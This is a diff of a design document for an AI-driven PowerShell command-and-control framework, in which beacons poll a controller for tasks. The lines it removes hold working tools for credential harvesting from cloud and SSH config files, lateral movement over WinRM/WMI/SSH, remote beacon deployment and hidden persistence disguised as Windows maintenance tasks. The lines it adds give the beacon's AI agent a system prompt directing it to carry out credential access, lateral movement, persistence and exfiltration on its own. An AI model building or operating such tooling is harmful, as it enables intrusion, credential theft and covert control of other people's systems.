@@ -12,10 +12,9 @@
 3. [Phase 1: Foundation](#3-phase-1-foundation)
 4. [Phase 2: Controller](#4-phase-2-controller)
 5. [Phase 3: Beacon Core](#5-phase-3-beacon-core)
-6. [Phase 4: Remaining Beacon Tools](#6-phase-4-remaining-beacon-tools)
-7. [Phase 5: Mesh](#7-phase-5-mesh)
-8. [Verification Steps](#8-verification-steps)
-9. [PshAgent API Reference](#9-pshagent-api-reference)
+6. [Phase 4: Mesh](#6-phase-4-mesh)
+7. [Verification Steps](#7-verification-steps)
+8. [PshAgent API Reference](#8-pshagent-api-reference)
 
 ---
 
@@ -59,15 +58,15 @@
 │  └─────┬─────┘  └──────┬──────┘  └────────┬───────────┘ │
 │        │               │                   │             │
 │        │    ┌──────────────────────────┐    │             │
-│        └───►│ Beacon Tools             │◄───┘             │
-│             │ host_recon, port_scan,   │                  │
-│             │ net_recon, cred_harvest, │                  │
-│             │ lateral_move, deploy,    │                  │
-│             │ persist, file_ops        │                  │
+│        └───►│ PshAgent Built-in Tools  │◄───┘             │
+│             │ run_command, read_file,  │                  │
+│             │ write_file, list_dir,    │                  │
+│             │ search_files, grep       │                  │
+│             │ + port_scan (custom)     │                  │
 │             └──────────────────────────┘                  │
 └──────────────────────────────────────────────────────────┘
                   │
-                  ▼ (Phase 5)
+                  ▼ (Phase 4)
 ┌─────────────────────────────────────────────────────────┐
 │                    MESH LAYER                             │
 │                                                           │
@@ -84,7 +83,7 @@
 | Controller | Background runspace + `HttpListener` | Not an agent itself — infrastructure |
 | Operator commands | `New-Tool` (×5) | list_beacons, task_beacon, get_results, deploy_beacon, kill_beacon |
 | Beacon AI brain | `New-Agent` + `Invoke-Agent` | Executes tasks from controller |
-| Beacon tools | `New-Tool` (×8) | host_recon, port_scan, net_recon, cred_harvest, lateral_move, deploy_beacon, persist, file_ops |
+| Beacon tools | PshAgent built-ins + `port_scan` | `run_command`, `read_file`, `write_file`, `list_directory`, `search_files`, `grep` — Claude reasons about tradecraft |
 | Beacon hooks | `New-Hook` (×4) | telemetry, check-in, kill switch, stealth |
 | Beacon stop | `StopCondition` | Kill switch or max-steps |
 | Sub-agents | `New-SubAgentTool` | For complex multi-step beacon tasks |
@@ -98,8 +97,9 @@ Operator types: "scan 10.0.1.0/24 from beacon-alpha"
   → PshAgent AI selects tool: task_beacon(beaconId='alpha', task='scan 10.0.1.0/24')
     → Controller queues task for beacon-alpha
       → Beacon-alpha checks in, receives task
-        → Beacon creates PshAgent, runs Invoke-Agent with port_scan tool
-          → Results flow back: tool output → check-in response → Controller → Operator
+        → Beacon creates PshAgent with built-in tools, runs Invoke-Agent
+          → Claude decides which tools to use (run_command, read_file, port_scan, etc.)
+            → Results flow back: tool output → check-in response → Controller → Operator
 ```
 
 ---
@@ -125,14 +125,8 @@ c2-mesh/
 │   ├── Register-Beacon.ps1         # POST /register on startup
 │   ├── Invoke-CheckIn.ps1          # POST /checkin (poll for tasks)
 │   ├── New-BeaconHooks.ps1         # 4 hooks (telemetry, checkin, kill, stealth)
-│   ├── New-BeaconTools.ps1         # 3 core tools (host_recon, port_scan, net_recon)
+│   ├── New-PortScanTool.ps1        # port_scan (only custom tool — rest are PshAgent built-ins)
 │   └── Start-C2Beacon.ps1          # Compose & launch beacon polling loop
-├── BeaconTools/
-│   ├── Invoke-CredHarvest.ps1      # cred_harvest tool
-│   ├── Invoke-LateralMove.ps1      # lateral_move tool
-│   ├── Invoke-DeployBeacon.ps1     # deploy_beacon tool (from beacon side)
-│   ├── Invoke-Persist.ps1          # persist tool
-│   └── Invoke-FileOps.ps1          # file_ops tool
 ├── Mesh/
 │   ├── New-MeshRelayTool.ps1       # Relay tasks through peer beacons
 │   ├── Invoke-MeshDiscovery.ps1    # Discover peer beacons on network
@@ -334,14 +328,8 @@ function New-C2Key {
         'Register-Beacon'
         'Invoke-CheckIn'
         'New-BeaconHooks'
-        'New-BeaconTools'
+        'New-PortScanTool'
         'Start-C2Beacon'
-        # Beacon Tools
-        'Invoke-CredHarvest'
-        'Invoke-LateralMove'
-        'Invoke-DeployBeacon'
-        'Invoke-Persist'
-        'Invoke-FileOps'
         # Mesh
         'New-MeshRelayTool'
         'Invoke-MeshDiscovery'
@@ -354,7 +342,7 @@ function New-C2Key {
 
 ```powershell
 # C2 Mesh Module Loader
-# Dot-source in dependency order: Config → Crypto → Controller → Beacon → BeaconTools → Mesh
+# Dot-source in dependency order: Config → Crypto → Controller → Beacon → Mesh
 
 $scriptRoot = $PSScriptRoot
 
@@ -376,17 +364,10 @@ $scriptRoot = $PSScriptRoot
 . "$scriptRoot/Beacon/Register-Beacon.ps1"
 . "$scriptRoot/Beacon/Invoke-CheckIn.ps1"
 . "$scriptRoot/Beacon/New-BeaconHooks.ps1"
-. "$scriptRoot/Beacon/New-BeaconTools.ps1"
+. "$scriptRoot/Beacon/New-PortScanTool.ps1"
 . "$scriptRoot/Beacon/Start-C2Beacon.ps1"
 
-# Beacon Tools (Phase 4)
-. "$scriptRoot/BeaconTools/Invoke-CredHarvest.ps1"
-. "$scriptRoot/BeaconTools/Invoke-LateralMove.ps1"
-. "$scriptRoot/BeaconTools/Invoke-DeployBeacon.ps1"
-. "$scriptRoot/BeaconTools/Invoke-Persist.ps1"
-. "$scriptRoot/BeaconTools/Invoke-FileOps.ps1"
-
-# Mesh (Phase 5)
+# Mesh (Phase 4)
 . "$scriptRoot/Mesh/New-MeshRelayTool.ps1"
 . "$scriptRoot/Mesh/Invoke-MeshDiscovery.ps1"
 . "$scriptRoot/Mesh/Invoke-SwarmTask.ps1"
@@ -397,9 +378,7 @@ Export-ModuleMember -Function @(
     'Get-BeaconRegistry', 'Send-BeaconTask', 'Get-BeaconResults',
     'New-OperatorTools', 'Start-C2Controller',
     'Register-Beacon', 'Invoke-CheckIn',
-    'New-BeaconHooks', 'New-BeaconTools', 'Start-C2Beacon',
-    'Invoke-CredHarvest', 'Invoke-LateralMove', 'Invoke-DeployBeacon',
-    'Invoke-Persist', 'Invoke-FileOps',
+    'New-BeaconHooks', 'New-PortScanTool', 'Start-C2Beacon',
     'New-MeshRelayTool', 'Invoke-MeshDiscovery', 'Invoke-SwarmTask'
 )
 ```
@@ -1269,140 +1248,26 @@ function New-BeaconHooks {
 }
 ```
 
-### 5.4 `Beacon/New-BeaconTools.ps1`
+### 5.4 `Beacon/New-PortScanTool.ps1`
 
-Three core recon tools:
+The only custom beacon tool. Everything else (file ops, command execution, recon) uses
+PshAgent's built-in tools (`run_command`, `read_file`, `write_file`, `list_directory`,
+`search_files`, `grep`). Claude already knows how to enumerate hosts, harvest creds,
+move laterally, etc. — it just needs the primitives.
 
 ```powershell
-function New-BeaconTools {
+function New-PortScanTool {
     <#
     .SYNOPSIS
-    Create the 3 core beacon tools. Returns PshAgentTool[] array.
-    host_recon, port_scan, net_recon
+    Create the port_scan tool. Returns PshAgentTool.
+    This is the only custom tool — TCP connect scan needs structured logic
+    that's faster than having Claude shell out to nmap/nc per-port.
     #>
     [CmdletBinding()]
-    [OutputType([PshAgentTool[]])]
+    [OutputType([PshAgentTool])]
     param()
 
-    # 1. host_recon — gather info about the current host
-    $hostRecon = New-Tool -Name 'host_recon' `
-        -Description 'Gather reconnaissance information about the current host: hostname, OS, IP addresses, running processes, logged-in users, installed software, environment variables.' `
-        -Parameters @{
-            type       = 'object'
-            properties = @{
-                sections = @{
-                    type        = 'array'
-                    description = 'Which sections to gather. Options: system, network, processes, users, software, env. Default: all.'
-                    items       = @{ type = 'string' }
-                }
-            }
-            required   = @()
-        } `
-        -Execute {
-            param($a)
-            $sections = if ($a.sections -and $a.sections.Count -gt 0) { $a.sections } else {
-                @('system', 'network', 'processes', 'users')
-            }
-
-            $output = [System.Text.StringBuilder]::new()
-
-            foreach ($section in $sections) {
-                switch ($section) {
-                    'system' {
-                        $null = $output.AppendLine("=== SYSTEM ===")
-                        $null = $output.AppendLine("Hostname: $([System.Net.Dns]::GetHostName())")
-                        $null = $output.AppendLine("OS: $([System.Runtime.InteropServices.RuntimeInformation]::OSDescription)")
-                        $null = $output.AppendLine("Architecture: $([System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture)")
-                        $null = $output.AppendLine("User: $([System.Environment]::UserName)")
-                        $null = $output.AppendLine("Domain: $([System.Environment]::UserDomainName)")
-                        $null = $output.AppendLine("PID: $PID")
-                        $null = $output.AppendLine("PS Version: $($PSVersionTable.PSVersion)")
-                        $null = $output.AppendLine(".NET: $([System.Runtime.InteropServices.RuntimeInformation]::FrameworkDescription)")
-                    }
-                    'network' {
-                        $null = $output.AppendLine("=== NETWORK ===")
-                        try {
-                            $addrs = Get-NetIPAddress -ErrorAction SilentlyContinue |
-                                Where-Object { $_.IPAddress -ne '127.0.0.1' -and $_.IPAddress -ne '::1' }
-                            foreach ($addr in $addrs) {
-                                $null = $output.AppendLine("  $($addr.InterfaceAlias): $($addr.IPAddress)/$($addr.PrefixLength)")
-                            }
-                        }
-                        catch {
-                            # Fallback for non-Windows
-                            $null = $output.AppendLine("  (Get-NetIPAddress unavailable — using .NET)")
-                            $interfaces = [System.Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces()
-                            foreach ($iface in $interfaces) {
-                                if ($iface.OperationalStatus -eq 'Up') {
-                                    $props = $iface.GetIPProperties()
-                                    foreach ($ua in $props.UnicastAddresses) {
-                                        $null = $output.AppendLine("  $($iface.Name): $($ua.Address)")
-                                    }
-                                }
-                            }
-                        }
-                    }
-                    'processes' {
-                        $null = $output.AppendLine("=== PROCESSES (top 20 by CPU) ===")
-                        $procs = Get-Process | Sort-Object CPU -Descending |
-                            Select-Object -First 20 Id, ProcessName, CPU, WorkingSet64
-                        foreach ($p in $procs) {
-                            $mem = [math]::Round($p.WorkingSet64 / 1MB, 1)
-                            $null = $output.AppendLine("  PID $($p.Id): $($p.ProcessName) | CPU: $($p.CPU) | Mem: ${mem}MB")
-                        }
-                    }
-                    'users' {
-                        $null = $output.AppendLine("=== USERS ===")
-                        $null = $output.AppendLine("Current: $([System.Environment]::UserDomainName)\$([System.Environment]::UserName)")
-                        try {
-                            # Windows: query user
-                            $quser = & query.exe user 2>&1
-                            if ($LASTEXITCODE -eq 0) {
-                                $null = $output.AppendLine($quser -join "`n")
-                            }
-                        }
-                        catch {
-                            # Linux/macOS: who
-                            try {
-                                $who = & who 2>&1
-                                $null = $output.AppendLine($who -join "`n")
-                            }
-                            catch { $null = $output.AppendLine("  (user enumeration unavailable)") }
-                        }
-                    }
-                    'software' {
-                        $null = $output.AppendLine("=== SOFTWARE ===")
-                        try {
-                            $software = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue |
-                                Where-Object { $_.DisplayName } |
-                                Select-Object DisplayName, DisplayVersion |
-                                Sort-Object DisplayName
-                            foreach ($s in $software | Select-Object -First 30) {
-                                $null = $output.AppendLine("  $($s.DisplayName) ($($s.DisplayVersion))")
-                            }
-                        }
-                        catch {
-                            $null = $output.AppendLine("  (registry enumeration unavailable on this OS)")
-                        }
-                    }
-                    'env' {
-                        $null = $output.AppendLine("=== ENVIRONMENT (selected) ===")
-                        $interesting = @('PATH', 'COMPUTERNAME', 'USERDOMAIN', 'LOGONSERVER',
-                            'HOMEDRIVE', 'HOMEPATH', 'TEMP', 'APPDATA', 'PROGRAMFILES')
-                        foreach ($var in $interesting) {
-                            $val = [System.Environment]::GetEnvironmentVariable($var)
-                            if ($val) { $null = $output.AppendLine("  ${var}=$val") }
-                        }
-                    }
-                }
-                $null = $output.AppendLine()
-            }
-
-            $output.ToString()
-        }
-
-    # 2. port_scan — TCP connect scan
-    $portScan = New-Tool -Name 'port_scan' `
+    return New-Tool -Name 'port_scan' `
         -Description 'TCP connect scan on a target host or CIDR range. Returns open ports.' `
         -Parameters @{
             type       = 'object'
@@ -1487,116 +1352,6 @@ function New-BeaconTools {
             if ($results.Count -eq 1) { $results.Add("No open ports found.") }
             $results -join "`n"
         }
-
-    # 3. net_recon — network neighborhood discovery
-    $netRecon = New-Tool -Name 'net_recon' `
-        -Description 'Network reconnaissance: ARP table, DNS resolution, routing table, active connections, network shares.' `
-        -Parameters @{
-            type       = 'object'
-            properties = @{
-                sections = @{
-                    type        = 'array'
-                    description = 'Which sections: arp, dns, routes, connections, shares. Default: all.'
-                    items       = @{ type = 'string' }
-                }
-            }
-            required   = @()
-        } `
-        -Execute {
-            param($a)
-            $sections = if ($a.sections -and $a.sections.Count -gt 0) { $a.sections } else {
-                @('arp', 'routes', 'connections')
-            }
-
-            $output = [System.Text.StringBuilder]::new()
-
-            foreach ($section in $sections) {
-                switch ($section) {
-                    'arp' {
-                        $null = $output.AppendLine("=== ARP TABLE ===")
-                        try {
-                            $arp = & arp -a 2>&1
-                            $null = $output.AppendLine(($arp | Out-String))
-                        }
-                        catch { $null = $output.AppendLine("  (arp unavailable)") }
-                    }
-                    'dns' {
-                        $null = $output.AppendLine("=== DNS CONFIG ===")
-                        try {
-                            $dns = Get-DnsClientServerAddress -ErrorAction SilentlyContinue |
-                                Where-Object { $_.ServerAddresses.Count -gt 0 }
-                            foreach ($d in $dns) {
-                                $null = $output.AppendLine("  $($d.InterfaceAlias): $($d.ServerAddresses -join ', ')")
-                            }
-                        }
-                        catch {
-                            try {
-                                $resolv = Get-Content /etc/resolv.conf -ErrorAction SilentlyContinue
-                                $null = $output.AppendLine(($resolv | Out-String))
-                            }
-                            catch { $null = $output.AppendLine("  (DNS config unavailable)") }
-                        }
-                    }
-                    'routes' {
-                        $null = $output.AppendLine("=== ROUTING TABLE ===")
-                        try {
-                            $routes = Get-NetRoute -ErrorAction SilentlyContinue |
-                                Where-Object { $_.DestinationPrefix -ne '0.0.0.0/0' } |
-                                Select-Object -First 20 DestinationPrefix, NextHop, InterfaceAlias
-                            foreach ($r in $routes) {
-                                $null = $output.AppendLine("  $($r.DestinationPrefix) via $($r.NextHop) ($($r.InterfaceAlias))")
-                            }
-                        }
-                        catch {
-                            try {
-                                $rt = & netstat -rn 2>&1
-                                $null = $output.AppendLine(($rt | Out-String))
-                            }
-                            catch { $null = $output.AppendLine("  (routing table unavailable)") }
-                        }
-                    }
-                    'connections' {
-                        $null = $output.AppendLine("=== ACTIVE CONNECTIONS ===")
-                        try {
-                            $conns = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue |
-                                Select-Object -First 30 LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess
-                            foreach ($c in $conns) {
-                                $proc = try { (Get-Process -Id $c.OwningProcess -ErrorAction SilentlyContinue).ProcessName } catch { '?' }
-                                $null = $output.AppendLine("  $($c.LocalAddress):$($c.LocalPort) -> $($c.RemoteAddress):$($c.RemotePort) [$proc]")
-                            }
-                        }
-                        catch {
-                            try {
-                                $ns = & netstat -an 2>&1
-                                $null = $output.AppendLine(($ns | Select-Object -First 30 | Out-String))
-                            }
-                            catch { $null = $output.AppendLine("  (connections unavailable)") }
-                        }
-                    }
-                    'shares' {
-                        $null = $output.AppendLine("=== NETWORK SHARES ===")
-                        try {
-                            $shares = Get-SmbShare -ErrorAction SilentlyContinue
-                            foreach ($s in $shares) {
-                                $null = $output.AppendLine("  $($s.Name): $($s.Path) [$($s.ShareType)]")
-                            }
-                        }
-                        catch {
-                            try {
-                                $ns = & net share 2>&1
-                                $null = $output.AppendLine(($ns | Out-String))
-                            }
-                            catch { $null = $output.AppendLine("  (shares unavailable)") }
-                        }
-                    }
-                }
-                $null = $output.AppendLine()
-            }
-
-            $output.ToString()
-        }
-
-    return @($hostRecon, $portScan, $netRecon)
 }
 ```
 
@@ -1664,9 +1419,19 @@ function Start-C2Beacon {
     # Kill flag — shared with hooks
     $killFlag = @{ Killed = $false }
 
-    # Build beacon tools
-    $coreTools   = New-BeaconTools
-    $allTools    = @($coreTools) + @($ExtraTools)
+    # Build beacon tools: PshAgent built-ins + port_scan
+    # Claude already knows how to do host recon, cred harvesting, lateral movement,
+    # persistence, file ops, etc. — just give it the primitives and let it reason.
+    $builtinTools = @(
+        (Read-FileContent)       # read_file
+        (Write-FileContent)      # write_file
+        (Get-DirectoryListing)   # list_directory
+        (Invoke-ShellCommand)    # run_command
+        (Search-Files)           # search_files
+        (Search-FileContent)     # grep
+    )
+    $portScan = New-PortScanTool
+    $allTools = @($builtinTools) + @($portScan) + @($ExtraTools)
 
     # Build beacon hooks
     $hooks = New-BeaconHooks -ControllerUrl $ControllerUrl -Key $Key -BeaconId $BeaconId -KillFlag $killFlag
@@ -1679,13 +1444,13 @@ function Start-C2Beacon {
 You are a C2 beacon agent running on host '$([System.Net.Dns]::GetHostName())' as user '$([System.Environment]::UserName)'.
 Your beacon ID is '$BeaconId'.
 
-You receive tasks from the controller and execute them using your available tools:
-- host_recon: Gather information about this host
-- port_scan: TCP scan targets
-- net_recon: Network neighborhood discovery
+You receive tasks from the controller and execute them autonomously using your tools.
+You have general-purpose tools: run_command, read_file, write_file, list_directory,
+search_files, grep, and port_scan. Use them to accomplish whatever is asked — recon,
+credential access, lateral movement, persistence, file exfiltration, etc.
 
-Execute tasks thoroughly but efficiently. Return clear, structured results.
-If a task is unclear, do your best interpretation. If a tool fails, try alternative approaches.
+Be resourceful. Adapt to the OS and environment. Use run_command for anything that
+doesn't have a dedicated tool. Return clear, structured results.
 "@
 
     # Beacon polling loop
@@ -1798,528 +1563,12 @@ Start-C2Beacon @params
 
 ---
 
-## 6. Phase 4: Remaining Beacon Tools
-
-### 6.1 `BeaconTools/Invoke-CredHarvest.ps1`
-
-```powershell
-function Invoke-CredHarvest {
-    <#
-    .SYNOPSIS
-    Create the cred_harvest tool. Returns PshAgentTool.
-    Attempts to extract credentials from common locations.
-    #>
-    [CmdletBinding()]
-    [OutputType([PshAgentTool])]
-    param()
-
-    return New-Tool -Name 'cred_harvest' `
-        -Description 'Harvest credentials from the current host: saved credentials, browser data, config files, environment variables, cached tokens.' `
-        -Parameters @{
-            type       = 'object'
-            properties = @{
-                sources = @{
-                    type        = 'array'
-                    description = 'Which sources to check: vault, browser, config_files, env, tokens, ssh_keys. Default: all.'
-                    items       = @{ type = 'string' }
-                }
-            }
-            required   = @()
-        } `
-        -Execute {
-            param($a)
-            $sources = if ($a.sources -and $a.sources.Count -gt 0) { $a.sources } else {
-                @('vault', 'config_files', 'env', 'tokens', 'ssh_keys')
-            }
-
-            $output = [System.Text.StringBuilder]::new()
-
-            foreach ($source in $sources) {
-                switch ($source) {
-                    'vault' {
-                        $null = $output.AppendLine("=== CREDENTIAL VAULT ===")
-                        try {
-                            # Windows Credential Manager via cmdkey
-                            $cmdkey = & cmdkey /list 2>&1
-                            if ($LASTEXITCODE -eq 0) {
-                                $null = $output.AppendLine(($cmdkey | Out-String))
-                            }
-                        }
-                        catch { $null = $output.AppendLine("  (credential vault unavailable)") }
-                    }
-                    'config_files' {
-                        $null = $output.AppendLine("=== CONFIG FILES ===")
-                        $searchPaths = @(
-                            (Join-Path $HOME '.aws' 'credentials'),
-                            (Join-Path $HOME '.azure' 'accessTokens.json'),
-                            (Join-Path $HOME '.docker' 'config.json'),
-                            (Join-Path $HOME '.kube' 'config'),
-                            (Join-Path $HOME '.git-credentials'),
-                            (Join-Path $HOME '.netrc'),
-                            (Join-Path $HOME '.pgpass')
-                        )
-                        foreach ($path in $searchPaths) {
-                            if (Test-Path $path) {
-                                $null = $output.AppendLine("  FOUND: $path")
-                                $content = Get-Content $path -Raw -ErrorAction SilentlyContinue
-                                if ($content) {
-                                    # Truncate large files
-                                    if ($content.Length -gt 500) { $content = $content.Substring(0, 500) + '...(truncated)' }
-                                    $null = $output.AppendLine("  Content: $content")
-                                }
-                            }
-                        }
-                    }
-                    'env' {
-                        $null = $output.AppendLine("=== ENVIRONMENT SECRETS ===")
-                        $secretPatterns = @('*KEY*', '*SECRET*', '*TOKEN*', '*PASSWORD*', '*PASS*', '*CREDENTIAL*', '*AUTH*')
-                        $envVars = [System.Environment]::GetEnvironmentVariables()
-                        foreach ($key in $envVars.Keys) {
-                            foreach ($pattern in $secretPatterns) {
-                                if ($key -like $pattern) {
-                                    $val = $envVars[$key]
-                                    if ($val.Length -gt 100) { $val = $val.Substring(0, 100) + '...' }
-                                    $null = $output.AppendLine("  $key = $val")
-                                    break
-                                }
-                            }
-                        }
-                    }
-                    'tokens' {
-                        $null = $output.AppendLine("=== CACHED TOKENS ===")
-                        # Azure CLI
-                        $azurePath = Join-Path $HOME '.azure' 'msal_token_cache.json'
-                        if (Test-Path $azurePath) {
-                            $null = $output.AppendLine("  Azure MSAL cache found: $azurePath")
-                        }
-                        # GCloud
-                        $gcloudPath = Join-Path $HOME '.config' 'gcloud' 'credentials.db'
-                        if (Test-Path $gcloudPath) {
-                            $null = $output.AppendLine("  GCloud credentials found: $gcloudPath")
-                        }
-                        # AWS session
-                        $awsSession = [System.Environment]::GetEnvironmentVariable('AWS_SESSION_TOKEN')
-                        if ($awsSession) {
-                            $null = $output.AppendLine("  AWS_SESSION_TOKEN is set")
-                        }
-                    }
-                    'ssh_keys' {
-                        $null = $output.AppendLine("=== SSH KEYS ===")
-                        $sshDir = Join-Path $HOME '.ssh'
-                        if (Test-Path $sshDir) {
-                            $files = Get-ChildItem $sshDir -File -ErrorAction SilentlyContinue
-                            foreach ($f in $files) {
-                                $null = $output.AppendLine("  $($f.Name) ($($f.Length) bytes)")
-                                # Check if key is encrypted
-                                if ($f.Name -notlike '*.pub' -and $f.Name -ne 'known_hosts' -and $f.Name -ne 'config') {
-                                    $firstLine = Get-Content $f.FullName -TotalCount 2 -ErrorAction SilentlyContinue
-                                    $encrypted = ($firstLine -join '') -match 'ENCRYPTED'
-                                    $null = $output.AppendLine("    Encrypted: $encrypted")
-                                }
-                            }
-                        }
-                        else {
-                            $null = $output.AppendLine("  No .ssh directory found")
-                        }
-                    }
-                }
-                $null = $output.AppendLine()
-            }
-
-            $output.ToString()
-        }
-}
-```
-
-### 6.2 `BeaconTools/Invoke-LateralMove.ps1`
-
-```powershell
-function Invoke-LateralMove {
-    <#
-    .SYNOPSIS
-    Create the lateral_move tool. Returns PshAgentTool.
-    Execute commands on a remote host via various protocols.
-    #>
-    [CmdletBinding()]
-    [OutputType([PshAgentTool])]
-    param()
-
-    return New-Tool -Name 'lateral_move' `
-        -Description 'Execute a command on a remote host using PowerShell remoting (WinRM), SSH, or WMI.' `
-        -Parameters @{
-            type       = 'object'
-            properties = @{
-                target   = @{ type = 'string'; description = 'Target hostname or IP' }
-                command  = @{ type = 'string'; description = 'Command to execute on the remote host' }
-                method   = @{
-                    type        = 'string'
-                    description = 'Execution method: winrm (default), ssh, wmi'
-                    enum        = @('winrm', 'ssh', 'wmi')
-                }
-                username = @{ type = 'string'; description = 'Username for authentication (optional — uses current creds if omitted)' }
-                password = @{ type = 'string'; description = 'Password for authentication (optional)' }
-            }
-            required   = @('target', 'command')
-        } `
-        -Execute {
-            param($a)
-            $target  = $a.target
-            $cmd     = $a.command
-            $method  = if ($a.method) { $a.method } else { 'winrm' }
-
-            # Build credential if provided
-            $cred = $null
-            if ($a.username -and $a.password) {
-                $secPass = ConvertTo-SecureString $a.password -AsPlainText -Force
-                $cred = [PSCredential]::new($a.username, $secPass)
-            }
-
-            try {
-                switch ($method) {
-                    'winrm' {
-                        $params = @{
-                            ComputerName = $target
-                            ScriptBlock  = [scriptblock]::Create($cmd)
-                            ErrorAction  = 'Stop'
-                        }
-                        if ($cred) { $params.Credential = $cred }
-                        $result = Invoke-Command @params
-                        "WinRM result from ${target}:`n$($result | Out-String)"
-                    }
-                    'ssh' {
-                        $sshCmd = if ($a.username) { "ssh $($a.username)@$target `"$cmd`"" }
-                                  else { "ssh $target `"$cmd`"" }
-                        $psi = [System.Diagnostics.ProcessStartInfo]::new('/bin/sh', "-c `"$($sshCmd.Replace('"','\"'))`"")
-                        $psi.RedirectStandardOutput = $true
-                        $psi.RedirectStandardError = $true
-                        $psi.UseShellExecute = $false
-                        $proc = [System.Diagnostics.Process]::Start($psi)
-                        $stdout = $proc.StandardOutput.ReadToEnd()
-                        $stderr = $proc.StandardError.ReadToEnd()
-                        $proc.WaitForExit(30000)
-                        $output = $stdout
-                        if ($stderr) { $output += "`nSTDERR: $stderr" }
-                        "SSH result from ${target}:`n$output"
-                    }
-                    'wmi' {
-                        $params = @{
-                            ComputerName = $target
-                            Class        = 'Win32_Process'
-                            Name         = 'Create'
-                            ArgumentList = @($cmd)
-                            ErrorAction  = 'Stop'
-                        }
-                        if ($cred) { $params.Credential = $cred }
-                        $result = Invoke-WmiMethod @params
-                        "WMI process created on ${target}: ReturnValue=$($result.ReturnValue), PID=$($result.ProcessId)"
-                    }
-                }
-            }
-            catch {
-                "Lateral move failed ($method to $target): $_"
-            }
-        }
-}
-```
-
-### 6.3 `BeaconTools/Invoke-DeployBeacon.ps1`
-
-```powershell
-function Invoke-DeployBeacon {
-    <#
-    .SYNOPSIS
-    Create the deploy_beacon tool (beacon-side). Returns PshAgentTool.
-    Deploys a new beacon to a target host from the current beacon.
-    .PARAMETER ControllerUrl
-    Controller URL to pass to the new beacon
-    .PARAMETER Key
-    Shared encryption key to pass to the new beacon
-    .PARAMETER ModulePayload
-    Base64-encoded c2-mesh module for transfer to target
-    #>
-    [CmdletBinding()]
-    [OutputType([PshAgentTool])]
-    param(
-        [Parameter(Mandatory)]
-        [string]$ControllerUrl,
-
-        [Parameter(Mandatory)]
-        [string]$Key,
-
-        [Parameter()]
-        [string]$ModulePayload
-    )
-
-    $ctrlUrl = $ControllerUrl
-    $sharedKey = $Key
-    $payload = $ModulePayload
-
-    return New-Tool -Name 'deploy_beacon' `
-        -Description 'Deploy a new C2 beacon to a remote host from this beacon. Uses PowerShell remoting.' `
-        -Parameters @{
-            type       = 'object'
-            properties = @{
-                target    = @{ type = 'string'; description = 'Target hostname or IP to deploy beacon to' }
-                username  = @{ type = 'string'; description = 'Username for authentication (optional)' }
-                password  = @{ type = 'string'; description = 'Password for authentication (optional)' }
-                beacon_id = @{ type = 'string'; description = 'Custom beacon ID for the new beacon (auto-generated if omitted)' }
-            }
-            required   = @('target')
-        } `
-        -Execute {
-            param($a)
-            $target = $a.target
-            $bid = if ($a.beacon_id) { $a.beacon_id } else { 'beacon-' + [guid]::NewGuid().ToString('N').Substring(0, 6) }
-
-            $cred = $null
-            if ($a.username -and $a.password) {
-                $secPass = ConvertTo-SecureString $a.password -AsPlainText -Force
-                $cred = [PSCredential]::new($a.username, $secPass)
-            }
-
-            # Build remote launch script
-            $remoteScript = @"
-`$ErrorActionPreference = 'Stop'
-# Decode and import module payload
-if ('$payload') {
-    `$bytes = [Convert]::FromBase64String('$payload')
-    `$tempDir = Join-Path `$env:TEMP 'c2-mesh-$bid'
-    New-Item -ItemType Directory -Path `$tempDir -Force | Out-Null
-    `$zipPath = Join-Path `$tempDir 'c2-mesh.zip'
-    [System.IO.File]::WriteAllBytes(`$zipPath, `$bytes)
-    Expand-Archive -Path `$zipPath -DestinationPath `$tempDir -Force
-    Import-Module (Join-Path `$tempDir 'PshAgent' 'PshAgent.psd1') -Force
-    Import-Module (Join-Path `$tempDir 'c2-mesh' 'c2-mesh.psd1') -Force
-}
-# Start beacon in background
-Start-Job -ScriptBlock {
-    Start-C2Beacon -ControllerUrl '$ctrlUrl' -Key '$sharedKey' -BeaconId '$bid'
-}
-"@
-
-            try {
-                $params = @{
-                    ComputerName = $target
-                    ScriptBlock  = [scriptblock]::Create($remoteScript)
-                    ErrorAction  = 'Stop'
-                }
-                if ($cred) { $params.Credential = $cred }
-                Invoke-Command @params
-                "Beacon '$bid' deployed to $target successfully."
-            }
-            catch {
-                "Deploy beacon failed to $target: $_"
-            }
-        }.GetNewClosure()
-}
-```
-
-### 6.4 `BeaconTools/Invoke-Persist.ps1`
-
-```powershell
-function Invoke-Persist {
-    <#
-    .SYNOPSIS
-    Create the persist tool. Returns PshAgentTool.
-    Establish persistence via various mechanisms.
-    #>
-    [CmdletBinding()]
-    [OutputType([PshAgentTool])]
-    param()
-
-    return New-Tool -Name 'persist' `
-        -Description 'Establish persistence on the current host using scheduled tasks, registry run keys, startup folder, or cron jobs.' `
-        -Parameters @{
-            type       = 'object'
-            properties = @{
-                method  = @{
-                    type        = 'string'
-                    description = 'Persistence method: scheduled_task, registry, startup_folder, cron, systemd'
-                    enum        = @('scheduled_task', 'registry', 'startup_folder', 'cron', 'systemd')
-                }
-                payload = @{ type = 'string'; description = 'Command or script to persist' }
-                name    = @{ type = 'string'; description = 'Name for the persistence entry (e.g., task name, registry value name)' }
-            }
-            required   = @('method', 'payload')
-        } `
-        -Execute {
-            param($a)
-            $method  = $a.method
-            $payload = $a.payload
-            $name    = if ($a.name) { $a.name } else { 'WindowsUpdate' + (Get-Random -Maximum 9999) }
-
-            try {
-                switch ($method) {
-                    'scheduled_task' {
-                        $action = New-ScheduledTaskAction -Execute 'powershell.exe' `
-                            -Argument "-WindowStyle Hidden -NoProfile -Command `"$payload`""
-                        $trigger = New-ScheduledTaskTrigger -AtLogOn
-                        Register-ScheduledTask -TaskName $name -Action $action -Trigger $trigger `
-                            -Description 'System Maintenance' -RunLevel Highest -ErrorAction Stop
-                        "Scheduled task '$name' created (runs at logon)."
-                    }
-                    'registry' {
-                        $regPath = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
-                        $value = "powershell.exe -WindowStyle Hidden -NoProfile -Command `"$payload`""
-                        Set-ItemProperty -Path $regPath -Name $name -Value $value -ErrorAction Stop
-                        "Registry run key '$name' set at $regPath."
-                    }
-                    'startup_folder' {
-                        $startupPath = [System.Environment]::GetFolderPath('Startup')
-                        $scriptPath = Join-Path $startupPath "$name.ps1"
